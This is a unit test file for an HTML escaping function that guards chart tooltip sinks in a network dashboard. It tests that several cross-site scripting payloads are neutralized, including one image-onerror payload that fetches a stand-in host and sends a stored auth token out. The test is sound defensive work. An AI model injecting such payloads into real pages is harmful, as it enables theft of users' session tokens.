import { describe, it, expect } from "vitest";
import { escapeHtml } from "./text";

// escapeHtml is the canonical HTML-context escaper used at every ECharts tooltip
// sink (panels bars, Flows pie, GeoTopologyMap circuits/sites, demo heatmap).
// This pins the security property in one place; the sinks import from here.
describe("escapeHtml (canonical)", () => {
  it("neutralizes the payloads that reach a tooltip innerHTML sink", () => {
    for (const p of [
      `<img src=x onerror=fetch('//e/?t='+localStorage.netops_token)>`,
      `<script>alert(1)</script>`,
      `"><svg/onload=alert(1)>`,
      `' onmouseover='alert(1)`,
    ]) {
      const out = escapeHtml(p);
      expect(out).not.toMatch(/[<>"']/);
    }
  });
  it("escapes ampersand first (not self-reversing)", () => {
    expect(escapeHtml("&lt;x&gt;")).toBe("&amp;lt;x&amp;gt;");
  });
  it("preserves legitimate device-name characters", () => {
    const n = "core-sw1 (rack 3) Gi0/0/1 [uplink] +spare";
    expect(escapeHtml(n)).toBe(n);
  });
  it("handles null/undefined as empty string", () => {
    expect(escapeHtml(undefined)).toBe("");
    expect(escapeHtml(null)).toBe("");
  });
});
